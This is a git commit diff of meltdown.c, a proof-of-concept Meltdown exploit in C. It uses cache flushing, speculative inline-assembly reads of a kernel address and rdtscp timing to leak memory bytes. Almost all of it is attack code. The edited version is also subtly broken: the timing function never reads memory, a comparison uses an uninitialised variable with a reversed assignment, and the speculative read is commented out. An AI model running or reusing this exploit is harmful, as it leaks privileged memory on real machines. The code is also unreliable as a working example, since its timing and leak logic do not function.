a295d35708f542527c2ba609c68dc08d6187e0f6
wzh9969 <13621244746@126.com>
2018-07-02 13:30:08 +0800

    meltdown

--- meltdown.c
+++ meltdown.c
@@ -6,106 +6,110 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <x86intrin.h>
+#include <sys/types.h>
+#include <sys/wait.h>
 #define PAGE_SIZE 4 * 1024
 #define ARRAY_SIZE 256
 
 static char target_array[ARRAY_SIZE * PAGE_SIZE];
 int check_array[ARRAY_SIZE];
 
+int get_access_time(volatile unsigned long addr)
+{
+	int time1,time2,a=1;
+	time1=__rdtscp(&a);
+	(void*)addr;
+	time2=__rdtscp(&a);
+	return time2-time1;
+}
+
 void clflush(void)
 {
 	int i;
+/*	time1 = __rdtscp(&zero);
+		(void*)addr;
+		time2 = __rdtscp(&zero);
+		printf("timebefore:%d--%d\n",time2-time1,i);*/
 	for (i = 0; i < ARRAY_SIZE; i++)
 		_mm_clflush(&target_array[i * PAGE_SIZE]);
+/*		time1 = __rdtscp(&zero);
+		(void*)addr;
+		time2 = __rdtscp(&zero);
+		printf("timeafter:%d--%d\n",time2-time1,i);
+		time1 = __rdtscp(&zero);
+		(void*)addr;
+		time2 = __rdtscp(&zero);
+		printf("timeafter:%d--%d\n",time2-time1,i);*/
 }
 
 extern char stopspeculate[];
 
 void speculate(unsigned long addr)
 {
-	pid_t pid=0;
-	pid=fork();
-	if(pid==0)
-	{
+//	pid_t pid=0;
+//	pid=fork();
+//	if(pid==0)
 //		printf("child!\n");
-	__asm__ __volatile__(
-		".rept 100\n\t"
-		"add $0xfff, %%rax\n\t"
+	asm volatile (
+		"1:\n\t"
+
+		".rept 300\n\t"
+		"add $0x141, %%rax\n\t"
 		".endr\n\t"
 
-		"movzx (%0), %%eax\n\t"
+		"movzx (%[addr]), %%eax\n\t"
 		"shl $12, %%rax\n\t"
-		"movzx (%1, %%rax, 1), %%rbx\n\t"
+		"jz 1b\n\t"
+		"movzx (%[target], %%rax, 1), %%rbx\n"
 
 		"stopspeculate: \n\t"
 		"nop\n\t"
 		:
-	: "r" (addr),"r" (target_array)
-		: "ax", "bx"
-		);
-	}
-	else
-	{
-//		printf("father!\n");
-		__asm__ __volatile__(
-		".rept 500\n\t"
-		"nop\n\t"
-		".endr\n\t"
-		:
-	: 
-		: "cx"
-		);
-	}
+		: [target] "r" (target_array),
+		  [addr] "r" (addr)
+		: "rax", "rbx"
+	);
 }
 void check(void)
 {
-	int i, min_i;
-	unsigned long long time1, time2;
-	unsigned long long min_time = 100000;
-	static unsigned int zero = 0;
-	unsigned long addr;
-	for (i = 0; i < ARRAY_SIZE; i++)
+	int i, t,min_time,min_i;
+	volatile char *addr;
+	for (i = 0; i < ARRAY_SIZE; i++) 
 	{
-		addr = (unsigned long)(target_array+i * PAGE_SIZE);
-		time1 = __rdtscp(&zero);
-		__asm__ __volatile__(
-			"movl (%0), %%eax\n\t"
-			:
-		: "r"(addr)
-			: "ax"
-			);
-		time2 = __rdtscp(&zero);
-		if (time2 - time1 < min_time)
+		addr = &target_array[i * PAGE_SIZE];
+		t = get_access_time(addr);
+		printf("time:%d--%d\n",t,i);
+		if(t<min_time)
 		{
-			min_time = time2 - time1;
-//			printf("min time:%d--%d\n",min_time,i);
-			min_i = i;
+			t=min_time;
+			min_i=i;
 		}
 	}
-//	printf("min_i=%d\n",min_i);
-	check_array[min_i]+=1;
-//	printf("checy_array=%d\n",check_array[min_i]);
+	check_array[min_i]++;
 }
 
 int readbyte(unsigned long addr)
 {
 	static char cache_time[256];
-	int max_i, max=0;
+	int max_i, max=0,time1,time2;
 	memset(check_array, 0, sizeof(check_array));
-	int i;
-	for (i = 0; i < 1000; i++)
+	int i,j;
+	unsigned long addr1=target_array;
+	for (i = 0; i < 1; i++)
 	{
+//		printf("111 %d\n",get_access_time(target_array));
 		clflush();
-		speculate(addr);
+//		printf("222 %d\n",get_access_time(target_array));
+//		printf("333 %d\n",get_access_time(target_array));
+//		speculate(addr);
 		check();
 	}
-	for (i = 0; i < ARRAY_SIZE; i++)
+	for(i=0;i<ARRAY_SIZE;i++)
 	{
-		printf("check_array[%d]=%d\n",i,check_array[i]);
-		if (check_array[i] > max)
+		if(max<check_array[i])
 		{
-			max = check_array[i];
-			max_i = i;
+			max_i=i;
+			max=check_array[i];
 		}
 	}
 	return max_i;
@@ -131,10 +135,12 @@ int set_signal(void)
 int main(int argc, char *argv[])
 {
 	int i, ret;
+	int fd;
 	unsigned long addr;
 	int size=10;
 	sscanf(argv[1], "%lx", &addr);
 	sscanf(argv[2], "%dx", &size);
+	ret=set_signal();
 	memset(target_array, 1, sizeof(target_array));
 	for (i = 0; i < size; i++)
 	{
